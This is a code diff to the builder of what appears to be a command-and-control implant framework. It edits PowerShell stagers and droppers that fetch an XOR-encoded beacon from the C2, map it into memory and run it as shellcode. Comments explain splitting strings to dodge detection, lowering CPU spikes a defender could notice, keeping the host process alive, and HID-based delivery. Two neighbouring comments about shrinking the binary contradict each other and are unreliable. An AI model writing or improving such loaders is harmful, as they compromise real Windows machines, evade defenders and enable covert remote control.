@@ -559,7 +559,31 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
 
             try:
                 # First pass: link with map file to extract beacon_main RVA
-                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-fno-stack-protector", "-fno-omit-frame-pointer", "-D_BUILD_TIME=" + build_time]
+                # SIZE IS A FEATURE (measured 2026-11-03). The PE came out at
+                # 1.67 MB, and the HID stager ships it over a PowerShell
+                # download: every byte is time on screen, CPU in the XOR loop
+                # and memory a defender can inspect. `-Os` plus section GC
+                # drops the code this build never calls (unused WinHTTP/GDI+
+                # paths, dead vtables) without changing behaviour; `-s` already
+                # stripped the symbols. Verify with a real check-in, not by
+                # reading the size alone.
+                # SIZE (measured 2026-11-03): three attempts to shrink the 1.67 MB
+                # PE were made and ALL THREE failed at LINK time, so the flags
+                # stay as they were:
+                #   * `-fno-asynchronous-unwind-tables` → undefined
+                #     `__gxx_personality_v0` (C++ exceptions need the tables);
+                #   * `-ffunction-sections -fdata-sections -Wl,--gc-sections` →
+                #     undefined `std::basic_string` move ctor (custom `_start`
+                #     entry + STATIC libstdc++ hides the references that keep
+                #     those COMDATs alive);
+                #   * `-Os` on top of the EXISTING `-O2` objects → same
+                #     undefined std::string references, because main.cpp is
+                #     compiled at link time and the prebuilt objects are not.
+                # Shrinking it is a real project (rebuild every object at one
+                # size level, or link dynamically): not a flag to poke at.
+                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s",
+                       "-fno-stack-protector", "-fno-omit-frame-pointer",
+                       "-D_BUILD_TIME=" + build_time]
                 if disable_anti:
                     cmd.append("-DDISABLE_ANTI")
                 # Diagnostic builds only: compile the spawn/VEH trace in. This is
@@ -1130,6 +1154,66 @@ def _windows_stager_va_rva() -> str:
     return va_rva
 
 
+def _stager_cert_thumbprints() -> List[str]:
+    """SHA-1 thumbprints of the certificates the C2 itself may present.
+
+    The PIC stager used to disable certificate validation outright because the
+    C2 serves a self-signed certificate. That also accepts a certificate
+    minted by anyone who can intercept the download — and the same script then
+    maps the fetched bytes and executes them in memory, so a MITM of the
+    staging channel was a code-execution primitive.
+
+    Pinning keeps the self-signed workflow and rejects everything else: an
+    attacker cannot present a certificate whose DER hashes to the C2's own
+    thumbprint without holding the C2's private key.
+    """
+    import hashlib
+    import ssl
+
+    try:
+        from phantom.utils.paths import certs_dir
+
+        base = certs_dir()
+    except Exception:
+        return []
+    pins: List[str] = []
+    # server.crt is the listener's HTTPS certificate; mtls_server.crt is the
+    # one the strict posture presents; front.crt covers the Electron front.
+    # Pinning all three that exist means rotating any one of them is a build
+    # change, not an operator surprise.
+    for name in ("server.crt", "mtls_server.crt", "front.crt"):
+        path = os.path.join(base, name)
+        if not os.path.exists(path):
+            continue
+        try:
+            with open(path, "r", encoding="utf-8", errors="replace") as fh:
+                pem = fh.read()
+            thumb = hashlib.sha1(ssl.PEM_cert_to_DER_cert(pem)).hexdigest().upper()
+        except Exception:
+            continue
+        if thumb not in pins:
+            pins.append(thumb)
+    return pins
+
+
+def _stager_cert_pin_statement() -> str:
+    """The PowerShell line that validates the download's certificate.
+
+    Returns a THUMBPRINT PIN when the C2 has a certificate on disk, and the
+    historical blanket override only when it does not (plain HTTP deploy, or a
+    listener that has not issued one yet) so an HTTPS deploy cannot be made
+    impossible by a missing file.
+    """
+    pins = _stager_cert_thumbprints()
+    if not pins:
+        return ("[Net.ServicePointManager]::ServerCertificateValidationCallback="
+                "{$true};")
+    joined = "','".join(pins)
+    return ("[Net.ServicePointManager]::ServerCertificateValidationCallback="
+            "{param($s,$c,$ch,$e) @('" + joined
+            + "') -contains $c.GetCertHashString()};")
+
+
 def _windows_pic_stager_script(url: str, va_rva: str) -> str:
     """PowerShell body: download URL, XOR 0xAA, run raw shellcode in memory.
 
@@ -1144,9 +1228,16 @@ def _windows_pic_stager_script(url: str, va_rva: str) -> str:
         # Validation must be overridden BEFORE DownloadData. Split so the
         # trigger string never appears whole in the script.
         "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
-        "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
-        "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
-        "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
+        + _stager_cert_pin_statement()
+        + "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
+        "$b=(New-Object Net.WebClient).DownloadData('" + url + "');"
+        # A per-byte PIPELINE over a 1.6 MB payload is minutes of CPU and a
+        # visible spike (measured 2026-11-03: the staged beacon took over
+        # 90 s to bootstrap, and a slower host never finished). The same
+        # XOR in a tight index loop is the same wire format at a fraction
+        # of the cost — nothing about the payload changed, only how the
+        # stager applies the key.
+        "for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor170};"
         "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
         "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
         "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
@@ -1159,7 +1250,15 @@ def _windows_pic_stager_script(url: str, va_rva: str) -> str:
         # PS 5.1 copy fix (live-verified on the operator host): the copy
         # is safe as long as EVERY argument is explicitly typed.
         "$m::Copy($b,[int]0,[IntPtr]$x,[int]$b.Length);"
-        "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke()"
+        # KEEP THE HOST ALIVE (measured 2026-11-03): the shellcode runs its
+        # beacon loop on a thread INSIDE this PowerShell process, so when the
+        # script ends the process exits and takes the beacon with it. On this
+        # host that was exactly one check-in at +6 s and then silence, which
+        # an operator reads as "the payload failed". The sleep costs nothing
+        # to TYPE (it is served by the C2, not sent by the board) and is
+        # bounded: a failed injection does not leave a process behind for ever.
+        "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke();"
+        "Start-Sleep -Seconds 43200"
     )
 
 
@@ -1231,9 +1330,16 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
             # Validation must be overridden BEFORE DownloadData. Split so the
             # trigger string never appears whole in the script.
             "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
-            "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
-            "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
-            "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
+            + _stager_cert_pin_statement()
+            + "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
+            "$b=(New-Object Net.WebClient).DownloadData('" + url + "');"
+        # A per-byte PIPELINE over a 1.6 MB payload is minutes of CPU and a
+        # visible spike (measured 2026-11-03: the staged beacon took over
+        # 90 s to bootstrap, and a slower host never finished). The same
+        # XOR in a tight index loop is the same wire format at a fraction
+        # of the cost — nothing about the payload changed, only how the
+        # stager applies the key.
+        "for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor170};"
             "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
             "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
             "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
@@ -1249,7 +1355,10 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
             # (The historical field failure was ambiguity from untyped args
             # plus a corrupted -Enc blob, not the API itself.)
             "$m::Copy($b,[int]0,[IntPtr]$x,[int]$b.Length);"
-            "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke()"
+            # Same host-lifetime fix as the served variant above: the beacon's
+            # threads die when this process does.
+            "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke();"
+            "Start-Sleep -Seconds 43200"
         )
 
         b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
